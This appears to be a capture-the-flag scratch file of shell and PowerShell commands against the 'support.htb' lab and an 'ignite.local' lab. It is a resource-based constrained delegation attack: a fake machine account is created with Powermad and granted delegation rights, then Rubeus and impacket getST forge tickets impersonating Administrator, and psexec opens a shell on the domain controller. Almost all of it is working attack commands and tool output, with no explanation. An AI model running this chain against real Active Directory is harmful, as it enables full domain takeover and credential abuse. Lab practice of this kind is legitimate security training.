```bash
upload /home/kali/Downloads/Rubeus.exe r.exe

./r.exe hash /domain:ignite.local /user:fake01 /password:123456

./r.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:host/dc1.support.htb /altservice:cifs /domain:support.htb /ptt

./r.exe hash /domain:support.htb /user:fake01$ /password:123456


/usr/share/doc/python3-impacket/examples/getST.py support.htb/fake01 -dc-ip 10.10.11.174 -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B

Import-Module ./Powermad.ps1

Set-Variable -Name "FakePC" -Value "FAKE02"


New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')


./r.exe hash /password:123456 /user:FAKE02$ /domain:support.htb

*Evil-WinRM* PS C:\Users\support\Documents> ./r.exe hash /password:123456 /user:FAKE02$ /domain:support.htb
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : FAKE02$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostfake02.support.htb
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 29A342E1A6FBAA56E45EEC45FBEA41F4
[*]       aes256_cts_hmac_sha1 : 32D144CD5F7A6766CE06D5432F2EBE18BAC8D768F2A4D1FE0D56B9CFCFEC7AA6
[*]       des_cbc_md5          : BC2F3DF4574CCB04


/usr/share/doc/python3-impacket/examples/getST.py support.htb/FAKE02 -dc-ip 10.10.11.174 -impersonate administrator -spn http/dc.support.htb -aesKey 32D144CD5F7A6766CE06D5432F2EBE18BAC8D768F2A4D1FE0D56B9CFCFEC7AA6

find / -name smbexec* 2>/dev/null

sudo /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass support.htb/administrator@dc1.support.htb -dc-ip 10.10.11.174 -target-ip 10.10.11.174



psexec.py -k -no-pass ignite.local/administrator@dc1.ignite.local -dc-ip 192.168.1.2 -target-ip 192.168.1.2

```

